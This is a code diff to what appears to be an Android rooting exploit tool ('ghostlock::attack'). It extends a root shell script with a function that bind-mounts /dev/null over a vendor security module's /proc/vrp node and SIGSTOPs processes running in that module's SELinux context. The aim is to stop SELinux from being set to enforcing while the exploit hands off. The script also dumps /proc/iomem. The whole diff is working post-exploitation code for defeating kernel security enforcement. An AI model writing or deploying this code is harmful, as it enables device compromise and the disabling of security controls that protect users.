@@ -250,7 +250,9 @@ namespace ghostlock::attack {
     }
 
     void write_root_script(void) {
-        std::string script(12288, '\0');
+        /* The SELinux enforce-write block adds ~2.5 KiB; 20 KiB keeps the
+         * script well clear of the truncation guard below. */
+        std::string script(20480, '\0');
         support::UniqueFd sfd(
             open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
         if (!sfd.valid()) {
@@ -265,6 +267,7 @@ namespace ghostlock::attack {
             "HOME_DIR='%s'\n"
             "LOG='%s'\n"
             "SAFE_MODE=%d\n"
+            "VRKO_SELINUX_BLOCK='%s'\n"
             "KSUD=\"$HOME_DIR/ksud\"\n"
             "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
             "chmod 644 \"$LOG\" 2>/dev/null\n"
@@ -293,6 +296,70 @@ namespace ghostlock::attack {
             "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
             "  exit 1\n"
             "fi\n"
+            /* The SELinux enforce-write block runs here: after the root-uid
+             * check and before the iomem cache and the policy fixup, so a
+             * 5.10.198 daemon cannot set SELinux to enforcing during the
+             * handoff's load/late-load. This blocks only the /proc/vrp 0/1
+             * write; the module's other hooks and checks are untouched. The
+             * mode is user-authoritative; Auto resolves from uname and the
+             * node's presence. Nothing here is fatal, and nothing unmounts or
+             * resumes: the device stays modified until reboot. */
+            "vrko_selinux_block() {\n"
+            "  mode=\"$VRKO_SELINUX_BLOCK\"\n"
+            "  kernel=$(uname -r)\n"
+            "  node=absent\n"
+            "  [ -e /proc/vrp ] && node=present\n"
+            "  rec=0\n"
+            "  case \"$kernel\" in 5.10.198*) rec=1 ;; esac\n"
+            "  if [ \"$mode\" = off ]; then\n"
+            "    echo \"[*] vr.ko selinux block: mode=off recommended=$rec effective=0 kernel=$kernel node=$node reason=user-off\" >>\"$LOG\"\n"
+            "    return 0\n"
+            "  fi\n"
+            "  if [ \"$node\" = absent ]; then\n"
+            "    echo \"[*] vr.ko selinux block: mode=$mode recommended=$rec effective=0 kernel=$kernel node=absent reason=node-absent\" >>\"$LOG\"\n"
+            "    return 0\n"
+            "  fi\n"
+            "  if [ \"$mode\" = on ]; then\n"
+            "    eff=1; reason=user-on\n"
+            "  else\n"
+            "    eff=$rec\n"
+            "    if [ \"$rec\" = 1 ]; then reason=auto-recommended; else reason=not-198-class; fi\n"
+            "  fi\n"
+            "  echo \"[*] vr.ko selinux block: mode=$mode recommended=$rec effective=$eff kernel=$kernel node=$node reason=$reason\" >>\"$LOG\"\n"
+            "  [ \"$eff\" = 1 ] || return 0\n"
+            "  myns=$(readlink /proc/self/ns/mnt 2>/dev/null)\n"
+            "  echo \"[*] vr.ko selinux block: pre node=$(stat -c '%%F' /proc/vrp 2>/dev/null) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\" >>\"$LOG\"\n"
+            "  scan_vrp() {\n"
+            "    for f in /proc/[0-9]*/attr/current; do\n"
+            "      [ -r \"$f\" ] || continue\n"
+            "      ctx=$(cat \"$f\" 2>/dev/null) || continue\n"
+            "      case \"$ctx\" in u:r:vrp*)\n"
+            "        p=${f#/proc/}; p=${p%%/attr/current}\n"
+            "        ns=$(readlink /proc/$p/ns/mnt 2>/dev/null)\n"
+            "        fd=$(readlink /proc/$p/fd/* 2>/dev/null | grep -c '/proc/vrp')\n"
+            "        echo \"$p|$ctx|$ns|$fd\"\n"
+            "      esac\n"
+            "    done\n"
+            "  }\n"
+            "  pre=$(scan_vrp)\n"
+            "  echo \"[*] vr.ko selinux block: pre vrp=${pre:-none}\" >>\"$LOG\"\n"
+            "  mount --bind /dev/null /proc/vrp 2>/dev/null; rc=$?\n"
+            "  echo \"[*] vr.ko selinux block: bind rc=$rc node=$(stat -c '%%F' /proc/vrp 2>/dev/null) mi=$(grep -c ' /proc/vrp ' /proc/self/mountinfo 2>/dev/null)\" >>\"$LOG\"\n"
+            "  stopped=\"\"\n"
+            "  for e in $pre; do\n"
+            "    p=${e%%%%|*}; ns=$(echo \"$e\" | cut -d'|' -f3); fd=$(echo \"$e\" | cut -d'|' -f4)\n"
+            "    if [ \"$rc\" -ne 0 ] || [ \"$ns\" != \"$myns\" ] || [ \"$fd\" -gt 0 ] || [ ! -c /proc/vrp ]; then\n"
+            "      kill -STOP \"$p\" 2>/dev/null && stopped=\"$stopped $p\"\n"
+            "    fi\n"
+            "  done\n"
+            "  for p in $stopped; do\n"
+            "    echo \"[*] vr.ko selinux block: stopped pid=$p $(grep -m1 '^State:' /proc/$p/status 2>/dev/null)\" >>\"$LOG\"\n"
+            "  done\n"
+            "  post=$(scan_vrp)\n"
+            "  echo \"[*] vr.ko selinux block: post node=$(stat -c '%%F' /proc/vrp 2>/dev/null) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) vrp=${post:-none}\" >>\"$LOG\"\n"
+            "  return 0\n"
+            "}\n"
+            "vrko_selinux_block\n"
             /* the rename is atomic, so a failed read leaves the old dump in place */
             "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
             "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
@@ -481,6 +548,7 @@ namespace ghostlock::attack {
             (config::runtime_config_snapshot().home_dir.c_str()),
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
             session::g_exploit_session.profile.safe_mode() ? 1 : 0,
+            config::vr_ko_mode_name(config::runtime_config_snapshot().vrko_selinux_block),
             (config::runtime_config_snapshot().debug_dir.c_str()));
         if (n < 0 || n >= static_cast<int32_t>(script.size())) {
             pr_warning("root script too long\n");
